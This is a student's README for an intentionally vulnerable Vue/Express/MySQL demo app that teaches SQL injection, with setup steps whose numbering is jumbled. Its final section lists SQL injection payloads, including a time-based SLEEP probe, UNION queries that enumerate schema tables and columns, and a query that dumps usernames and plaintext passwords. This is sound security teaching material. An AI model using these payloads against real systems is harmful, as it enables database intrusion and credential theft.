# Secure Systems Assignment 2 - SQL Injection
# Bearach Byrne - C15379616

This is a simple web app originally taken from https://github.com/TanayB11/sql-injection-demo.git, with some minor modifications.

This application is a lesson in how not to create a web application. It purposefully does not make use of any defenses against SQLi attacks.

## Stack
- Vue
- Node + Express
- MySQL

The below setup guide is for Linux (I set it up and ran it on Ubuntu 20.04.4 LTS

## Setup
1. Clone the repo to a directory - `git clone https://github.com/BearachB/sql_inject_demo.git`
8. Install Homebrew - `/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)`. Ensure you add Homebrew to your path and bash shell profile script (follow prompts after installing Homebrew). 
9. Install MySQL `brew install mysql`
10. Start the MySQL server with `mysql.server start`
11. Login to MySQL with `mysql -u root -p`. The default password is blank
12. Run `ALTER USER 'root'@'localhost' IDENTIFIED BY 'new_password';` to change your MySQL password
14. `QUIT` exits the MySQL monitor - Note: `mysql.server stop` stops the MySQL server. Do not run this if you are using the server.
15. Add your MySQL credentials to an environment variable.
```bash
$ cd server
$ echo 'MYSQL_CREDS="mysql_password"' > .env
```

10. To start the Express Server.
```bash
$ cd client && yarn install     # Installs client dependencies
$ cd ../server && yarn install  # Installs server dependencies
$ yarn dev                      # Starts Express server
```
11. To start the Vue server: In a new terminal, run:
```bash
$ cd client
$ yarn serve                    # Starts Vue.js server
```
12. This should open your default browser and connect to your local Vue server, if this doesn't happen go to your browser and manually connect to localhost:8080. 
13. Try search for a computer part, such as "cpu" or "board".
14. Try some SQLi inputs in the search box:
```
-- Sleeps for 2 seconds per item found
SELECT * FROM products WHERE name LIKE '%steel%' AND 0 = SLEEP(2); -- 

-- Selects everything
SELECT * FROM products WHERE name LIKE '%'; -- 

-- Append 1, 2, 3 on the bottom
SELECT ?, ?, ? FROM products WHERE name LIKE '%steel%' UNION (SELECT 1, 2, 3 FROM dual);  -- 

-- Get a list of tables
SELECT ?, ?, ? FROM products WHERE name LIKE '%steel%' UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3 FROM information_schema.tables);  -- 

-- Get all columns from "users" table
SELECT ?, ?, ? FROM products WHERE name LIKE '%steel%' UNION (SELECT COLUMN_NAME, 2, 3 FROM information_schema.columns WHERE TABLE_NAME = 'users');  -- 

-- Grab usernames and passwords (stored in plain text)
SELECT ?, ?, ? FROM products WHERE name LIKE '%steel%' UNION (SELECT id, username, password FROM users);  -- 
```
If you get errors connecting to MySQL, run the following:
`$ mysql -u root -p`
```SQL
ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'mysql_password';
flush privileges;
QUIT;
```
